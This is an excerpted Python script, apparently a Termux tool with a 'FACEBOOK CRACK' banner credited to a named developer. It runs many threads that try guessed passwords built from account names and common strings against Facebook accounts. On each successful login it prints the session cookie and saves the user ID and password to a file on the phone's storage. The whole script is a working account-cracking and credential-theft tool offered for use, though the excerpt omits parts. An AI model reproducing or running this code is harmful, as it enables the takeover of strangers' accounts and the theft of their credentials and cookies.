...
`~~88~~' d8' `8b 888o  88 88    88   `88'   88  `8D 
 ...
 \033[1;91m\033[1;41m\033[1;97m              WELCOME TO TANVIR TOOLS               \033[;0m\033[1;91m\033[1;92m           

\033[1;92m══════════════════════════════════════════
\033[1;32m[-] DEVELOPER:\033[1;32m TANVIR AHAMED 
\033[1;32m[-] TOOLS    :\033[1;32m FACEBOOK CRACK
\033[1;32m[-] VERSION  :\033[1;32m 0.1
\033[1;32m[-] WORKING  :\033[1;32m DATA/WIFI
\033[1;32m[-] FACEBOOK : Tanvir Ahmed 
\033[1;92m══════════════════════════════════════════
...
def admin():
	...
	if bal =='1':
		os.system('xdg-open https://wa.me/+8801717738724');time.sleep(1)
		admin()
	if bal =='2':
		os.system('xdg-open https://github.com/TANVIR5-404');time.sleep(1)
		admin()
	if bal =='0':
		Main()
...
def virusA():
	...
	with ThreadPool(max_workers=60) as yaari:
		...
		for guru in user:
			...
			pwx = [koda+kodb+guru,kodb+guru,kode+koda+kodb,kode+kode,kode+'123',kode+'1234','FREE FIRE','free fire','i love you','khan123','last123','fast123']
...
def b(uid,pwx,tl):
    ...
    try:
        for ps in pwx:
            ...
            sys.stdout.write(f'\r \033[1;90m[\033[1;93m[TANVIR]\033[1;90m] \033[1;96m%s/%s\033[1;90m \033[1;90m[\033[1;92mOK:%s\033[1;90m] '%(loop,tl,len(oks))),
            sys.stdout.flush()
    ...
    'user-agent': pro
            ...
            if 'c_user' in log_cookies:
                ...
                cid = coki[65:80]
                print(f'\r\33[1;92m [TANVIR] '+uid+' | '+ps+'\33[0;92m')
                print(f'\r\033[1;92m=[💚]=COOKIE : '+coki)
                oks.append(cid)
                open('/sdcard/TANVIR-ok.txt', 'a').write(uid+' | '+ps+' | '+uid+'\n')
                break
            else:
                continue
        loop+=1        
